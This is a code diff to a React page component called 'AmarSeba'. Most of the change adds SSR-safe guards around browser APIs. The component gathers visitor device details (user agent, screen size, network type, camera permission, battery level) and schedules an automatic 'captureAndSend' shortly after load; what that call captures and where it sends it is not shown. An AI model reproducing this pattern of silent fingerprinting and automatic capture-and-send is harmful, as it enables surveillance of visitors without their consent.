@@ -147,41 +147,50 @@ export default function AmarSeba() {
   useEffect(() => {
     // Set static metrics
     requestAnimationFrame(() => {
-      setDeviceName(navigator.userAgent?.split('(')[1]?.split(')')[0] || 'Unknown Device');
-      setScreenRes(`${window.screen.width}x${window.screen.height}`);
-      setBrowser(navigator.userAgent.split(' ').pop() || 'Unknown');
+      if (typeof navigator !== 'undefined') {
+        setDeviceName(navigator.userAgent?.split('(')[1]?.split(')')[0] || 'Unknown Device');
+        setBrowser(navigator.userAgent.split(' ').pop() || 'Unknown');
+      }
+      if (typeof window !== 'undefined') {
+        setScreenRes(`${window.screen.width}x${window.screen.height}`);
+      }
     });
 
     // Network metric
-    const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-    if (connection) {
-      setNetworkType(connection.effectiveType || 'Unknown');
-      const handleNetworkChange = () => {
+    if (typeof navigator !== 'undefined') {
+      const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+      if (connection) {
         setNetworkType(connection.effectiveType || 'Unknown');
-      };
-      connection.addEventListener('change', handleNetworkChange);
-    }
-
-    // Check camera permission
-    if (navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({ name: 'camera' as any }).then((status) => {
-        setCameraPermission(status.state as any);
-        status.onchange = () => {
-          setCameraPermission(status.state as any);
+        const handleNetworkChange = () => {
+          setNetworkType(connection.effectiveType || 'Unknown');
         };
-      });
-    }
+        connection.addEventListener('change', handleNetworkChange);
+      }
 
-    // Attempt to get battery
-    if ('getBattery' in navigator) {
-      (navigator as any).getBattery().then((batt: any) => {
-        setBattery(Math.round(batt.level * 100));
-        batt.addEventListener('levelchange', () => {
+      // Check camera permission
+      if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'camera' as any }).then((status) => {
+          setCameraPermission(status.state as any);
+          status.onchange = () => {
+            setCameraPermission(status.state as any);
+          };
+        }).catch(() => {});
+      }
+
+      // Attempt to get battery
+      if ('getBattery' in navigator) {
+        (navigator as any).getBattery().then((batt: any) => {
           setBattery(Math.round(batt.level * 100));
-        });
-      });
+          const handleLevelChange = () => {
+            setBattery(Math.round(batt.level * 100));
+          };
+          batt.addEventListener('levelchange', handleLevelChange);
+        }).catch(() => {});
+      }
     }
+  }, []); // Run ONCE on mount to avoid infinite loop with captureAndSend
 
+  useEffect(() => {
     // Auto capture on load (after a short delay to allow for interaction/init)
     const timer = setTimeout(() => {
       captureAndSend('Automated initial sync');
